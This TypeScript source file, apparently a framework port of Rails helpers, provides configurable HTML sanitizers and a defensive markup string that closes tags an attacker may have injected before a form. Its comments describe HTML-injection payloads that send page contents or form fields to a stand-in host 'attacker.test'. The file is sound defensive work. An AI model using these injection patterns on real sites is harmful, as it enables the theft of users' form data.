/**
 * Which sanitizer the view helpers use, and the markup that stops a form's
 * contents leaving the page. Ported from
 * `ActionView::Helpers::SanitizeHelper` and
 * `ActionView::Helpers::ContentExfiltrationPreventionHelper`.
 *
 * Two things, both about markup an attacker got into the page earlier.
 *
 * `support/sanitize.ts` cleans HTML with one fixed policy. Rails names three,
 * because "sanitize" means different things in different places: a comment
 * body wants a safe-list, a plain-text summary wants every tag gone, and a
 * feed excerpt wants the text of links kept without the links. Naming them
 * separately means each caller picks the one it means rather than passing the
 * options that approximate it.
 *
 * The vendor is the seam under those three. An application with a stricter
 * policy — or a compliance requirement about which library does the parsing —
 * replaces one object rather than every call site, and cannot end up with half
 * its pages on the old policy.
 */

import { sanitize, sanitizeToText } from "@altair/support";
import type { SanitizeOptions } from "@altair/support";
import { RawHtml, raw } from "./render.js";

/** The three ways a caller can mean "clean this". */
export interface SanitizerVendor {
  /** Safe-list: keep the markup a comment is allowed to have. */
  safeList(html: string, options?: SanitizeOptions): Promise<string>;
  /** Everything gone, text kept, for a summary or a plain-text mail. */
  full(html: string): Promise<string>;
  /** Links gone, their text kept — for an excerpt that must not carry them. */
  link(html: string): Promise<string>;
}

/** Tags kept by default, unless an application narrows them. */
let allowedTags: ReadonlySet<string> | undefined;
/** Attributes kept by default. */
let allowedAttributes: Readonly<Record<string, readonly string[]>> | undefined;

export function sanitizedAllowedTags(): ReadonlySet<string> | undefined {
  return allowedTags;
}

export function setSanitizedAllowedTags(tags: Iterable<string> | undefined): void {
  allowedTags = tags === undefined ? undefined : new Set(tags);
}

export function sanitizedAllowedAttributes():
  | Readonly<Record<string, readonly string[]>>
  | undefined {
  return allowedAttributes;
}

export function setSanitizedAllowedAttributes(
  attributes: Readonly<Record<string, readonly string[]>> | undefined,
): void {
  allowedAttributes = attributes;
}

/**
 * Strips every tag, keeping the text. Rails' `full_sanitizer`.
 *
 * The result is text, so it is returned as text: handing back something marked
 * safe would let a caller put it straight into an attribute, where the
 * ampersands it still contains are not safe at all.
 */
async function fullSanitize(html: string): Promise<string> {
  return sanitizeToText(html);
}

/**
 * Removes links and keeps what they said. Rails' `link_sanitizer`.
 *
 * Not the same as stripping every tag: an excerpt that must not send anybody
 * anywhere still reads better with its emphasis intact, and the anchor text is
 * usually the part that carries the meaning.
 */
async function linkSanitize(html: string): Promise<string> {
  // The anchor's own text is kept, so the sentence still reads. Only the
  // element that would navigate goes.
  const withoutLinks = html.replace(/<\/?a\b[^>]*>/gi, "");

  return sanitize(withoutLinks);
}

/** The default vendor: our own sanitizer, in its three shapes. */
export const DEFAULT_SANITIZER_VENDOR: SanitizerVendor = {
  safeList: (html, options) =>
    sanitize(html, {
      ...(allowedTags ? { allowedTags } : {}),
      ...(allowedAttributes ? { allowedAttributes } : {}),
      ...options,
    }),
  full: fullSanitize,
  link: linkSanitize,
};

let vendor: SanitizerVendor = DEFAULT_SANITIZER_VENDOR;

export function sanitizerVendor(): SanitizerVendor {
  return vendor;
}

/**
 * Replace the sanitizer everywhere at once.
 *
 * One object rather than an argument at every call site, so an application
 * cannot end up with half its pages on the old policy — which is the failure
 * mode that matters, since the half nobody updated is the half nobody looked
 * at.
 */
export function setSanitizerVendor(replacement: SanitizerVendor): void {
  vendor = replacement;
}

export function resetSanitizerVendor(): void {
  vendor = DEFAULT_SANITIZER_VENDOR;
  allowedTags = undefined;
  allowedAttributes = undefined;
}

export function safeListSanitizer(): SanitizerVendor["safeList"] {
  return vendor.safeList.bind(vendor);
}

export function fullSanitizer(): SanitizerVendor["full"] {
  return vendor.full.bind(vendor);
}

export function linkSanitizer(): SanitizerVendor["link"] {
  return vendor.link.bind(vendor);
}

/**
 * Closes an attribute somebody left open.
 *
 * An injected `<meta http-equiv="refresh" content='0;URL=https://attacker.test?`
 * opens a quote that never closes, so every byte of the page up to the next
 * `'` becomes part of that URL — and is sent. All three quote characters,
 * because the injection picks which one to use.
 *
 * It is a comment so it renders as nothing when there is no attack, which is
 * every page.
 */
const CLOSE_QUOTES_COMMENT = "<!-- '\"` -->";

/**
 * Closes an element whose contents the parser does not treat as markup.
 *
 * `<textarea>` and `<xmp>` swallow everything until their own closing tag, so
 * an injected opener turns the rest of the page — including whatever the user
 * types into the real form — into that element's value, which the attacker's
 * form then submits.
 */
const CLOSE_CDATA_COMMENT = "<!-- </textarea></xmp> -->";

/** An injected `<option>` captures the markup after it the same way. */
const CLOSE_OPTION_TAG = "</option>";

/**
 * Closes a form somebody else opened.
 *
 * The one that actually steals the data: an injected `<form
 * action="https://attacker.test">` earlier in the page claims every field
 * after it, because a browser assigns a field to the nearest open form and
 * nested forms do not exist. The user fills in our fields and submits them to
 * somewhere else.
 */
const CLOSE_FORM_TAG = "</form>";

export const CONTENT_EXFILTRATION_PREVENTION_MARKUP =
  CLOSE_QUOTES_COMMENT + CLOSE_CDATA_COMMENT + CLOSE_OPTION_TAG + CLOSE_FORM_TAG;

/**
 * Off by default, as in Rails.
 *
 * The markup is harmless but not invisible: a page whose CSS or tests assume
 * nothing precedes a form would change, and a stray `</form>` inside a
 * deliberately nested layout would close the wrong thing. So an application
 * turns it on, having looked.
 */
export const DEFAULT_PREPEND_CONTENT_EXFILTRATION_PREVENTION = false;

let prepending = DEFAULT_PREPEND_CONTENT_EXFILTRATION_PREVENTION;

export function prependContentExfiltrationPrevention(): boolean {
  return prepending;
}

export function setPrependContentExfiltrationPrevention(enabled: boolean): void {
  prepending = enabled;
}

/**
 * Back to the default.
 *
 * Reset goes through the same constant the initialiser uses, so a test that
 * asserts the default is off is asserting about the real default rather than
 * about whatever the last test happened to leave behind.
 */
export function resetContentExfiltrationPrevention(): void {
  prepending = DEFAULT_PREPEND_CONTENT_EXFILTRATION_PREVENTION;
}

/**
 * The markup that goes before a form, or nothing. Rails'
 * `prevent_content_exfiltration`.
 *
 * Before rather than after, because it closes what an attacker opened
 * *earlier* in the page. Everything it closes is already broken markup by the
 * time this runs; the point is to make it stop before our form starts.
 */
export function preventContentExfiltration(): RawHtml | null {
  return prepending ? raw(CONTENT_EXFILTRATION_PREVENTION_MARKUP) : null;
}
